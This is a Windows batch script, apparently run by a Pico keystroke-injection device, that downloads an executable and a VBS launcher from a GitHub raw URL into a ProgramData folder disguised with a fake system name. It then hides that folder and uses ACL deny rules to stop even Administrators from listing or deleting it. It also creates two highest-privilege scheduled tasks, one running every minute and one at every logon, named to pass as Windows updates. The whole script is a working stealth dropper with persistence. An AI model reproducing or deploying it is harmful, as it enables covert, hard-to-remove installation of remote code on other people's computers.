@echo off
:: Check for Admin Rights
net session >nul 2>&1
if %errorLevel% neq 0 (echo [!] Run as Admin & pause & exit)

:: Configuration
set "fakeID=SystemUpdate.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
set "laptopPath=C:\ProgramData\%fakeID%\WinServiceUpdate"
:: Use your RAW GitHub links here
set "rawBase=https://raw.githubusercontent.com/Voryx-IT/Desktop-Goose/main"

echo [1/3] Downloading & Mirroring Files...
if not exist "%laptopPath%" mkdir "%laptopPath%" >nul 2>&1

:: Download files directly to the hidden path
powershell -NoP -Command "iwr '%rawBase%/WinServiceUpdate.exe' -OutFile '%laptopPath%\WinServiceUpdate.exe'"
powershell -NoP -Command "iwr '%rawBase%/Silencer.vbs' -OutFile '%laptopPath%\Silencer.vbs'"

echo [2/3] Applying Smart Locks...
:: Grant SYSTEM and Admins the right to run the files
icacls "C:\ProgramData\%fakeID%" /inheritance:r >nul 2>&1
icacls "C:\ProgramData\%fakeID%" /grant:r SYSTEM:(OI)(CI)RX >nul 2>&1
icacls "C:\ProgramData\%fakeID%" /grant:r Administrators:(OI)(CI)RX >nul 2>&1

:: DENY Folder Listing (RD) and Deletion (DE) to hide and protect
icacls "C:\ProgramData\%fakeID%" /deny *S-1-1-0:(RD,DE) >nul 2>&1
icacls "C:\ProgramData\%fakeID%" /deny Administrators:(RD,DE) >nul 2>&1

:: Hide as a Protected System File
attrib +h +s +r "C:\ProgramData\%fakeID%" /s /d >nul 2>&1

echo [3/3] Setting Ultra-Persistent Triggers (1-min + Login)...
:: Trigger 1: Every 1 minute
schtasks /create /f /tn "WinServiceUpdate" /tr "wscript.exe \"%laptopPath%\Silencer.vbs\"" /sc minute /mo 1 /rl HIGHEST >nul 2>&1

:: Trigger 2: At every Logon
schtasks /create /f /tn "WinServiceUpdate_Startup" /tr "wscript.exe \"%laptopPath%\Silencer.vbs\"" /sc onlogon /rl HIGHEST >nul 2>&1

echo Launching...
start "" "wscript.exe" "%laptopPath%\Silencer.vbs"
echo DONE!
:: The Pico's 'Janitor' job will close this window in 15 seconds automatically.
